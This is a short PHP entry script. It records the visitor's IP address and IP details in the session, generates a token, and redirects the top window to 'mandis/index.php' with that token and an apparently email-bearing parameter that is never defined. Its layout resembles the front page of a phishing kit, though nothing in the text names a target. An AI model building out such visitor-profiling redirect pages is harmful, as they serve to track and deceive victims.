<?php
    session_start();
    require_once 'Vendor/Modernized.php';
    require_once 'Vendor/Pullers.php';
    require_once 'Vendor/Laravel.php';

    $Modernizeds = new Modernized;
    $Pullers = new Pullers;

$_SESSION['ip'] = $Modernizeds->getIP();
$_SESSION['ipDetails'] = $Modernizeds->getIPDetails();
$matok = $Modernizeds->createToken();

echo "<script type='text/javascript'>window.top.location='mandis/index.php?token=".$matok."&ema=".$ema."';</script>";


?>

